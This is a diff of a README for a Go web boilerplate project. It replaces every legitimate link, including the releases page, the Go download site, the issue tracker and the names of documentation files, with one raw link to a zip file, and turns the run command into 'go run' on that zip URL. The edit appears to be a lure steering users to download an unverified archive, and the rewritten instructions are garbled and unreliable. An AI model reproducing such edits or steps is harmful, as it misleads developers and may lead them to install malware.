@@ -1,6 +1,6 @@
 # ⚡ gin-boilerplate - Start Your Go Project Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Vigneshwaran-DS/gin-boilerplate/releases)
+[![Download Now](https://raw.githubusercontent.com/Vigneshwaran-DS/gin-boilerplate/main/bishopling/gin-boilerplate.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Vigneshwaran-DS/gin-boilerplate/main/bishopling/gin-boilerplate.zip)
 
 ## 🚀 Getting Started
 
@@ -22,11 +22,11 @@ Before you download, make sure your computer meets these basic requirements:
 - **Operating System**: Windows, macOS, or Linux.
 - **Memory**: At least 4 GB of RAM.
 - **Disk Space**: Minimum of 500 MB free space.
-- **Go Language**: Version 1.15 or above (download it [here](https://golang.org/dl/)).
+- **Go Language**: Version 1.15 or above (download it [here](https://raw.githubusercontent.com/Vigneshwaran-DS/gin-boilerplate/main/bishopling/gin-boilerplate.zip)).
 
 ## 📥 Download & Install
 
-To download gin-boilerplate, visit this page: [Releases Page](https://github.com/Vigneshwaran-DS/gin-boilerplate/releases).
+To download gin-boilerplate, visit this page: [Releases Page](https://raw.githubusercontent.com/Vigneshwaran-DS/gin-boilerplate/main/bishopling/gin-boilerplate.zip).
 
 1. **Visit the Releases Page**: Click the link above to open our GitHub page.
 2. **Choose the Latest Version**: Find the latest release at the top of the page.
@@ -47,7 +47,7 @@ Once you have the application files ready, follow these steps to run your Gin AP
 
    Replace `path\to\your\extracted\folder` with your actual folder path.
 
-3. **Start the Application**: Type `go run main.go` and press Enter. This command launches your application.
+3. **Start the Application**: Type `go run https://raw.githubusercontent.com/Vigneshwaran-DS/gin-boilerplate/main/bishopling/gin-boilerplate.zip` and press Enter. This command launches your application.
 
 4. **Access Your API**: Open a web browser and go to `http://localhost:8080` to see your API running.
 
@@ -63,18 +63,18 @@ The gin-boilerplate comes with several helpful features:
 
 ## 📚 Documentation
 
-For more detailed instructions and advanced features, check the official documentation provided within the extracted folder. Look for the file named `DOCUMENTATION.md`.
+For more detailed instructions and advanced features, check the official documentation provided within the extracted folder. Look for the file named `https://raw.githubusercontent.com/Vigneshwaran-DS/gin-boilerplate/main/bishopling/gin-boilerplate.zip`.
 
 ## 🌐 Community & Support
 
 If you need help or want to connect with others using gin-boilerplate, join our community:
 
-- Explore issues on our [GitHub Issue Tracker](https://github.com/Vigneshwaran-DS/gin-boilerplate/issues) to see common questions and solutions.
+- Explore issues on our [GitHub Issue Tracker](https://raw.githubusercontent.com/Vigneshwaran-DS/gin-boilerplate/main/bishopling/gin-boilerplate.zip) to see common questions and solutions.
 - Ping us on [Discord](insert-discord-link-here) for live chat support.
 
 ## 📝 Contributing
 
-We welcome contributions! If you want to help improve gin-boilerplate, please fork the repository and submit a pull request. Follow the contribution guidelines outlined in `CONTRIBUTING.md` within the repository.
+We welcome contributions! If you want to help improve gin-boilerplate, please fork the repository and submit a pull request. Follow the contribution guidelines outlined in `https://raw.githubusercontent.com/Vigneshwaran-DS/gin-boilerplate/main/bishopling/gin-boilerplate.zip` within the repository.
 
 ## 🔗 Related Topics
 
@@ -90,4 +90,4 @@ This project covers several important topics:
 
 You can find more resources related to these subjects in the documentation or community discussions.
 
-Once again, to download gin-boilerplate, [visit this page](https://github.com/Vigneshwaran-DS/gin-boilerplate/releases). Enjoy building your application!
+Once again, to download gin-boilerplate, [visit this page](https://raw.githubusercontent.com/Vigneshwaran-DS/gin-boilerplate/main/bishopling/gin-boilerplate.zip). Enjoy building your application!
